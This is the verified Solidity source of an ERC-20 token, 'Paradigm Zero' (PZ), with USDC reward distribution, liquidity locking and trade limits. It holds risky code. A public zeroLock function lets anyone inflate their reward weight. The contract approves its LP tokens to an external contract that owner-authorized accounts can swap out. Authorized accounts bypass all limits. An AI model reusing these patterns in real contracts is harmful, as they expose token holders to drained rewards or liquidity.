/**
 *Submitted for verification at Etherscan.io on 2023-02-01
*/

/*
https://t.me/paradigmzero
https://paradigmzero.finance/
https://twitter.com/ParadigmZeroETH

Here to set new standards
Always 0/0
Rewards in USDC

*/
pragma solidity ^0.8.17;

//SPDX-License-Identifier: MIT

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
}

abstract contract Auth {
    address internal owner;
    address internal zer0;
    mapping (address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        zer0 = 0xE9d39D5b1EEb143FADA974980F17a273Ef8e2209;
        authorizations[_owner] = true;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }

    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }

    modifier Zer0() {
        require(isZer0(msg.sender), "!Zer0"); _;
    }

    function authorize(address adr) public onlyOwner {
        authorizations[adr] = true;
    }

    function unauthorize(address adr) public onlyOwner {
        authorizations[adr] = false;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    function isZer0(address adr) internal view returns (bool) {
        return adr == zer0;
    }

    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IPancakeSwapPair {
		event Approval(address indexed owner, address indexed spender, uint value);
		event Transfer(address indexed from, address indexed to, uint value);

		function name() external pure returns (string memory);
		function symbol() external pure returns (string memory);
		function decimals() external pure returns (uint8);
		function totalSupply() external view returns (uint);
		function balanceOf(address owner) external view returns (uint);
		function allowance(address owner, address spender) external view returns (uint);

		function approve(address spender, uint value) external returns (bool);
		function transfer(address to, uint value) external returns (bool);
		function transferFrom(address from, address to, uint value) external returns (bool);

		function DOMAIN_SEPARATOR() external view returns (bytes32);
		function PERMIT_TYPEHASH() external pure returns (bytes32);
		function nonces(address owner) external view returns (uint);

		function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

		event Mint(address indexed sender, uint amount0, uint amount1);
		event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
		event Swap(
				address indexed sender,
				uint amount0In,
				uint amount1In,
				uint amount0Out,
				uint amount1Out,
				address indexed to
		);
		event Sync(uint112 reserve0, uint112 reserve1);

		function MINIMUM_LIQUIDITY() external pure returns (uint);
		function factory() external view returns (address);
		function token0() external view returns (address);
		function token1() external view returns (address);
		function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
		function price0CumulativeLast() external view returns (uint);
		function price1CumulativeLast() external view returns (uint);
		function kLast() external view returns (uint);

		function mint(address to) external returns (uint liquidity);
		function burn(address to) external returns (uint amount0, uint amount1);
		function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
		function skim(address to) external;
		function sync() external;

		function initialize(address, address) external;
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
}


interface IDividendDistributor {
    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external;
    function setShare(address shareholder, uint256 amount) external;
    function deposit() external payable;
    function process(uint256 gas) external;
}

contract DividendDistributor is IDividendDistributor {
    using SafeMath for uint256;

    address _token;

    struct Share {
        uint256 amount;
        uint256 totalExcluded;
        uint256 totalRealised;
    }

    IERC20 BUSD = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    IDEXRouter router;

    address[] shareholders;
    mapping (address => uint256) shareholderIndexes;
    mapping (address => uint256) shareholderClaims;

    mapping (address => Share) public shares;

    uint256 public totalShares;
    uint256 public totalDividends;
    uint256 public totalDistributed;
    uint256 public dividendsPerShare;
    uint256 public dividendsPerShareAccuracyFactor = 10 ** 36;

    uint256 public minPeriod = 1800 seconds;
    uint256 public minDistribution = 10000;

    uint256 currentIndex;

    bool initialized;
    modifier initialization() {
        require(!initialized);
        _;
        initialized = true;
    }

    modifier onlyToken() {
        require(msg.sender == _token); _;
    }

    constructor (address _router) {
        router = _router != address(0)
        ? IDEXRouter(_router)
        : IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _token = msg.sender;
    }

    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external override onlyToken  {
        minPeriod = _minPeriod;
        minDistribution = _minDistribution;
    }

    function setShare(address shareholder, uint256 amount) external override onlyToken {
        if(shares[shareholder].amount > 0){
            distributeDividend(shareholder);
        }

        if(amount > 0 && shares[shareholder].amount == 0){
            addShareholder(shareholder);
        }else if(amount == 0 && shares[shareholder].amount > 0){
            removeShareholder(shareholder);
        }

        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);
        shares[shareholder].amount = amount;
        shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
    }

    function deposit() external payable override onlyToken {
        uint256 balanceBefore = BUSD.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = address(BUSD);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: msg.value}(
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amount = BUSD.balanceOf(address(this)).sub(balanceBefore);

        totalDividends = totalDividends.add(amount);
        dividendsPerShare = dividendsPerShare.add(dividendsPerShareAccuracyFactor.mul(amount).div(totalShares));
    }

    function process(uint256 gas) external override onlyToken{
        uint256 shareholderCount = shareholders.length;

        if(shareholderCount == 0) { return; }

        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        uint256 iterations = 0;

        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0;
            }

            if(shouldDistribute(shareholders[currentIndex])){
                distributeDividend(shareholders[currentIndex]);
            }

            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }

    function shouldDistribute(address shareholder) internal view returns (bool) {
        return shareholderClaims[shareholder] + minPeriod < block.timestamp
        && getUnpaidEarnings(shareholder) > minDistribution;
    }

    function distributeDividend(address shareholder) internal {
        if(shares[shareholder].amount == 0){ return; }

        uint256 amount = getUnpaidEarnings(shareholder);
        if(amount > 0){
            totalDistributed = totalDistributed.add(amount);
            BUSD.transfer(shareholder, amount);
            shareholderClaims[shareholder] = block.timestamp;
            shares[shareholder].totalRealised = shares[shareholder].totalRealised.add(amount);
            shares[shareholder].totalExcluded = getCumulativeDividends(shares[shareholder].amount);
        }
    }

    function claimDividend(address _holder) external {
        distributeDividend(_holder);
    }

    function totals() external view returns (uint256,uint256,uint256){
        return (totalDividends,totalDistributed, totalShares);
    }

    function rewardWeight(address _holder) external view returns (uint256){
        return shares[_holder].amount;
    }

    function rewardsPaid(address _holder) external view returns (uint256){
        return shares[_holder].totalRealised;
    }

    function getUnpaidEarnings(address shareholder) public view returns (uint256) {
        if(shares[shareholder].amount == 0){ return 0; }

        uint256 shareholderTotalDividends = getCumulativeDividends(shares[shareholder].amount);
        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;

        if(shareholderTotalDividends <= shareholderTotalExcluded){ return 0; }

        return shareholderTotalDividends.sub(shareholderTotalExcluded);
    }

    function getCumulativeDividends(uint256 share) internal view returns (uint256) {
        return share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
}

interface Zero{
    function PZ(uint256 zeroAmount, uint256 divisor, address _token) external;
}

//for holding to pair LP
contract TokenHolder is Auth{

    IERC20 zeroToken;

    uint256 lockTimeT;
    mapping (address => uint256) allowedTokens;

    constructor(address _owner) Auth(msg.sender){
        authorizations[_owner] = true;
        zeroToken =  IERC20(msg.sender);
    }

    function requestWithdraw(uint256 _amount) external authorized {
        lockTimeT = block.timestamp + 1 days;
        allowedTokens[msg.sender] = _amount;
    }
    function withdraw() external authorized{
        require(block.timestamp >= lockTimeT);
        zeroToken.transfer(msg.sender, allowedTokens[msg.sender]);

    }
}

interface IModule{
    function gameCheck(address sender, address receiver, uint256 amount) external;
}


contract ParadigmZero is IERC20, Auth {
    using SafeMath for uint256;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    IWETH WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 WETH2 = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Zero Zer0C = Zero(0x52b6023900ADE788a10059f29042c54d74731358);

    address LS;

    IPancakeSwapPair public pairContract;

    IDEXRouter public router;
    address public pair;

    DividendDistributor distributor;
    address public distributorAddress;

    TokenHolder stash;

    IModule iMod;

    uint256 distributorGas = 400000;

    string constant _name = "Paradigm Zero";
    string constant _symbol = "PZ";
    uint8 constant _decimals = 9;
    
    uint256 _totalSupply = 100 * 10**6 * (10 ** _decimals); //
    

    //txn limit/wallet amount
    uint256 public _maxTxAmount = _totalSupply.mul(10).div(1000); //
    uint256 public _maxWalletToken =  _totalSupply.mul(10).div(1000); //

    bool limits = true;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;


    mapping (address => bool) isTxLimitExempt;
    mapping (address => bool) isDividendExempt;

    //token locking for greater reward weight
    mapping (address => uint256) zeroLocked;
    mapping (address => bool) psLocked;
    mapping (address => bool) zLocked;

    mapping (address => bool) pzBot;

    //Basic MEV prevention
    address mevBook;
    mapping (address => uint256) buyBlock;


    //'fee' breakdown
    uint256 public rewardDivisor = 4;
    uint256 public liqDivisor = 1;
    uint256 public treasuryDivisor = 3;
    uint256 public moduleDivisor = 2;
    uint256 public totalDivisor = rewardDivisor.add(liqDivisor).add(treasuryDivisor).add(moduleDivisor);

    bool liqAdd = true;

    address public treasuryWallet;
    address public moduleWallet;

    //tracking for ZP
    uint256 zeroAmount;

    //trade starting
    uint256 launchTime;
    bool lsStart;
    bool tradingOpened = false;
    event TradingStarted(bool enabled);

    bool initPZ;
    modifier zero() { initPZ = true; _; initPZ = false; }

    event AddLiq(uint256 amountETH, uint256 amountZero);

    uint256 splitFreq = 300;

    bool requestEnabled = true;

    bool unlockRequested;
    uint256 lockTime;
    event LiquidityUnlockRequested(uint256 _time);

    //prevents exploits
    uint256 public zCooldown = 1;
    uint256 lastZBlock;

    bool moduleActivated;

    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        pair = IDEXFactory(router.factory()).createPair(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));
        _allowances[address(this)][address(router)] = _totalSupply;
        pairContract = IPancakeSwapPair(pair);
        distributor = new DividendDistributor(address(router));
        distributorAddress = address(distributor);

        stash = new TokenHolder(msg.sender);

        isTxLimitExempt[msg.sender] = true;
        isDividendExempt[pair] = true;
        isDividendExempt[address(this)] = true;
        isDividendExempt[DEAD] = true;
        isDividendExempt[address(router)] = true;
        isDividendExempt[address(stash)] = true;

        authorizations[address(stash)] = true;

        isTxLimitExempt[msg.sender] = true;
    
        treasuryWallet = 0xE93216Ea91Fa2e2c0Ea9Cc9af72027ef56c46bb6;
        moduleWallet = 0x7da2e340db9F1e5fB9326E75320F7A08eC0aa409;

        LS = 0x590a7cC27d9607C03085f725ac6B85Ac9EF85967;

        isDividendExempt[LS] = true;

        approve(address(router), _totalSupply);
        approve(address(pair), _totalSupply);
        _balances[owner] = _totalSupply;
        emit Transfer(address(0), owner, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }


    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setWallets(address _treasuryWallet, address _moduleWallet) external authorized {
        treasuryWallet = _treasuryWallet;
        moduleWallet = _moduleWallet;
    }

    function claim() external{
        distributor.claimDividend(msg.sender);
    }

    function startTrading() external onlyOwner {
        tradingOpened = true;
        launchTime = block.timestamp;

        emit TradingStarted(true);
    }

    function changeSplitFreq(uint256 _freq) external authorized{
        splitFreq = _freq;
    }

    function getBotData() external view returns(uint256, uint256){
        return (splitFreq, distributorGas);
    }

    function rewardCriteria(uint256 _minPeriod, uint256 _minDistribution) external authorized{
        distributor.setDistributionCriteria(_minPeriod,_minDistribution);
    }

    function gasChange(uint256 _amount) external authorized{
        distributorGas = _amount;
    }

    function lockLP(uint256 _lockTime) external authorized{
        require(_lockTime < 9999999999, "Avoid potential timestamp overflow");
        require(_lockTime >= block.timestamp + 10 days && _lockTime >= lockTime);
        requestEnabled = false;
        unlockRequested = false;
        lockTime = _lockTime;
    }

    //we plan to have a PZ capable locker, so need a rolling way to remove LP. There is a 10 day window so request must be made 10 days in advance
    function requestLPUnlock() external authorized{
        require(requestEnabled);
        lockTime = block.timestamp + 10 days;
        unlockRequested = true;
        emit LiquidityUnlockRequested(block.timestamp);
    }

    function updatePZBot(address _pzbot) external authorized{
        pzBot[_pzbot] = true;
    }

    function unlockWindowCheck() external view returns (bool){
        return unlockRequested;
    }
        
    function lpTimeCheck() external view returns (uint256){
        return lockTime;
    }

    function weightCheck(address _holder) external view returns (bool, uint256){
        bool _locked = ((zLocked[_holder] || psLocked[_holder]) ? true : false);
        uint256 _weight = psLocked[_holder] ? _balances[_holder] * 2 : _balances[_holder] + zeroLocked[_holder];
        return (_locked,_weight);
    }

    function lpTimeCheckInSeconds() external view returns (uint256){
        return lockTime - block.timestamp;
    }

    function unlockLPAfterTime() external authorized{
        require(block.timestamp >= lockTime,"Too early");
        require(unlockRequested);
        IERC20 _token = IERC20(pair);
        uint256 balance = _token.balanceOf(address(this));
        bool _success = _token.transfer(owner, balance);
        require(_success, "Token could not be transferred");
    }

    function lpExtend(uint256 newTime) external onlyOwner{
        require(newTime < 9999999999, "Avoid potential timestamp overflow");
        require(newTime > lockTime);
        lockTime = newTime;
    }

    function liftMax() external authorized {
        limits = false;
    }

    function setIsTxLimitExempt(address holder, bool exempt) external authorized {
        isTxLimitExempt[holder] = exempt;
    }

    function setIsDividendExempt(address holder, bool exempt) external authorized {
        isDividendExempt[holder] = exempt;
    }

    function liqidAdd() public payable zero{

        uint256 money = msg.value;
        uint256 token = balanceOf(address(this));


        router.addLiquidityETH{value: money}(
                address(this),
                token,
                0,
                0,
                address(this),
                block.timestamp
            );
            emit AddLiq(money, token);
    }

    function checkLPBal() internal view returns (uint256){
        return pairContract.balanceOf(address(this));
    }

    function getPair() external view returns(address){
        return pair;
    }

    function changeZero(address newZ) external authorized{
        Zer0C = Zero(newZ);
    }

    function changeModuleContract(address _mod, bool _enabled) external authorized{
        iMod = IModule(_mod);
        moduleActivated = _enabled;
    }

    function toggleLiqDivisor(bool _enabled) external {
        require(pzBot[msg.sender]);
        liqAdd = _enabled;
    }

    function setDivisors(uint256 _reward, uint256 _liq, uint256 _treasury, uint256 _module) external authorized{
        rewardDivisor = _reward;
        liqDivisor = _liq;
        treasuryDivisor = _treasury;
        moduleDivisor = _module;
        totalDivisor = rewardDivisor.add(liqDivisor).add(treasuryDivisor).add(moduleDivisor);
    }

    //super basic mev blocker
    function mevCheck(address _source) internal view{
        if (buyBlock[_source] == block.number){
            require(mevBook == _source);
        }
    }

    //module
    function zeroLock(uint256 _amount) public{
        zeroLocked[msg.sender] = _amount;
        zLocked[msg.sender] = true;
        try distributor.setShare(msg.sender, (_balances[msg.sender] + zeroLocked[msg.sender])) {} catch {}
    }

    function addLiq() internal {
        uint256 _liqAdd = WETH2.balanceOf(address(this));
        WETH2.transferFrom(address(this), pair, _liqAdd);
        pairContract.sync();
    }

    function divideFunds() public zero {

        uint256 ETHBal = address(this).balance;
        uint256 tokenBal = _balances[address(Zer0C)];

        uint256 lp = ETHBal.mul(liqDivisor).div(totalDivisor);
        if (lp > 0 && liqAdd){
            WETH.deposit{value : lp}();
            addLiq();      
        }
        
        if (rewardDivisor > 0) {
            uint256 rewardsM = ETHBal.mul(rewardDivisor).div(totalDivisor);
            try distributor.deposit{value: rewardsM}() {} catch {}
        } 

        if (moduleDivisor > 0){
            uint256 module = ETHBal.mul(moduleDivisor).div(totalDivisor);
            (bool tmpSuccess,) = payable(moduleWallet).call{value: module, gas: 75000}("");
            tmpSuccess = false;
        }

        uint256 treasury = address(this).balance;
        if (treasury > 0){
            (bool tmpSuccess,) = payable(treasuryWallet).call{value: treasury, gas: 75000}("");
            tmpSuccess = false;
        }

        if (tokenBal > 0){_basicTransfer(address(Zer0C), address(stash), tokenBal);} 
        try distributor.process(distributorGas) {} catch {}
    }

    function sendRewards() public zero{
        try distributor.process(distributorGas) {} catch {}
    }

    function setMaxWallet(uint256 percent) external authorized {
        require(percent >= 5); //0.5% of supply, no lower
        require(percent <= 50); //5% of supply, no higher
        _maxWalletToken = ( _totalSupply * percent ) / 1000;
    }

    function setTxLimit(uint256 percent) external authorized {
        require(percent >= 5); //0.5% of supply, no lower
        require(percent <= 50); //5% of supply, no higher
        _maxTxAmount = ( _totalSupply * percent ) / 1000;
    }

    function checkLimits(address sender,address recipient, uint256 amount) internal view {

        if (!authorizations[sender] && recipient != address(this) && sender != address(this)  
            && recipient != address(DEAD) && recipient != pair && recipient != treasuryWallet){
                uint256 heldTokens = balanceOf(recipient);
                require((heldTokens + amount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");
            }

        require(amount <= _maxTxAmount || isTxLimitExempt[sender] || isTxLimitExempt[recipient], "TX Limit Exceeded");

    }

    function changeZCooldown(uint256 _cooldown) external authorized{
        zCooldown = _cooldown;
    }

    function clearStuckBalance() public  {
        uint256 amountETH = address(this).balance;
        (bool tmpSuccess,) = payable(treasuryWallet).call{value: amountETH, gas: 75000}("");
        tmpSuccess = false;
    }

    function _lsTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);

        if (sender == pair){
            zeroAmount = zeroAmount.add(amount);
        }

        if (!psLocked[sender] && !psLocked[recipient]){
            if(!isDividendExempt[sender]){ try distributor.setShare(sender, (_balances[sender] + zeroLocked[sender])) {} catch {} }
            if(!isDividendExempt[recipient]){ try distributor.setShare(recipient, (_balances[recipient] + zeroLocked[recipient])) {} catch {} }
        }
        if(psLocked[sender]){ try distributor.setShare(sender, _balances[sender] * 2) {} catch {} }
        if(psLocked[recipient]){ try distributor.setShare(recipient, _balances[recipient] * 2) {} catch {} }

        emit Transfer(sender, recipient, amount);
        return true;
    }

    function startTradingLS() external onlyOwner{
        lsStart = true;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        if (isAuthorized(msg.sender)){
            return _basicTransfer(msg.sender, recipient, amount);
        }
        else {
            return _transferFrom(msg.sender, recipient, amount);
        }
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if(_allowances[sender][msg.sender] != _totalSupply){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if (authorizations[sender]|| authorizations[recipient] || initPZ){
            return _basicTransfer(sender, recipient, amount);
        }
        if ((sender == LS || recipient == LS) && lsStart){
            return _lsTransfer(sender, recipient, amount);
        }

        if (psLocked[sender] || zLocked[sender]){
            require(balanceOf(sender) >= zeroLocked[sender] + amount);
        }

        if(!authorizations[sender] && !authorizations[recipient]){
            require(tradingOpened == true,"Trading not open yet");
        }

        if (limits){
            checkLimits(sender, recipient, amount);
        }

        //selling
        if (recipient == pair){
            mevCheck(sender);
            if (zeroAmount > 0 && !initPZ && lastZBlock + zCooldown <= block.number){
                initPZ = true;

                pairContract.approve(address(Zer0C),checkLPBal());

                try Zer0C.PZ(zeroAmount, totalDivisor, address(this)) 
                {zeroAmount = 0;
                lastZBlock = block.number; 
                } 
                catch {}

                pairContract.approve(address(Zer0C),0);
                initPZ = false;
            }
            
            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

            _balances[recipient] = _balances[recipient].add(amount);

            if (!psLocked[sender]){
                if(!isDividendExempt[sender]){ try distributor.setShare(sender, (_balances[sender] + zeroLocked[sender])) {} catch {} }
            
            }
            else if(psLocked[sender]){ try distributor.setShare(sender, _balances[sender] * 2) {} catch {} }
        }
        //buying
        else if(sender == pair){
            if (recipient != address(this) && recipient != pair){
                zeroAmount = zeroAmount.add(amount);
                buyBlock[recipient] = block.number;
                mevBook = recipient;
            }
            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

            _balances[recipient] = _balances[recipient].add(amount);

            if (!psLocked[recipient]){
                if(!isDividendExempt[recipient]){ try distributor.setShare(recipient, (_balances[recipient] + zeroLocked[recipient])) {} catch {} }
            
            }
            else if(psLocked[recipient]){ try distributor.setShare(recipient, _balances[recipient] * 2) {} catch {} }

        }

        //transfer
        else{
            mevCheck(sender);

            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

            _balances[recipient] = _balances[recipient].add(amount);
            if (!psLocked[sender] && !psLocked[recipient]){
                if(!isDividendExempt[sender]){ try distributor.setShare(sender, (_balances[sender] + zeroLocked[sender])) {} catch {} }
                if(!isDividendExempt[recipient]){ try distributor.setShare(recipient, (_balances[recipient] + zeroLocked[recipient])) {} catch {} }
            }
            if(psLocked[sender]){ try distributor.setShare(sender, _balances[sender] * 2) {} catch {} }
            if(psLocked[recipient]){ try distributor.setShare(recipient, _balances[recipient] * 2) {} catch {} }
        }


        //game contract
        if (moduleActivated){
            try iMod.gameCheck(sender, recipient, amount) {} catch {}
        }


        try distributor.process(100000) {} catch {}
        
        emit Transfer(sender, recipient, amount);


        return true;
    }

    function airdrop(address[] calldata addresses, uint[] calldata tokens, bool _lock) external onlyOwner {
        uint256 airCapacity = 0;
        require(addresses.length == tokens.length,"Mismatch between Address and token count");
        for(uint i=0; i < addresses.length; i++){
            airCapacity = airCapacity + tokens[i];
        }
        require(balanceOf(msg.sender) >= airCapacity, "Not enough tokens to airdrop");
        
        if (_lock){
            for(uint i=0; i < addresses.length; i++){
                _balances[addresses[i]] += tokens[i];
                _balances[msg.sender] -= tokens[i];
                zeroLocked[addresses[i]] += (tokens[i] / 2);
                psLocked[addresses[i]] = true;
                distributor.setShare(addresses[i], tokens[i] * 2);
                emit Transfer(msg.sender, addresses[i], tokens[i]);
            }  
        }
        else {
            for(uint i=0; i < addresses.length; i++){
                _balances[addresses[i]] += tokens[i];
                _balances[msg.sender] -= tokens[i];
                distributor.setShare(addresses[i], tokens[i]);
                emit Transfer(msg.sender, addresses[i], tokens[i]);
            }
        }

    }

}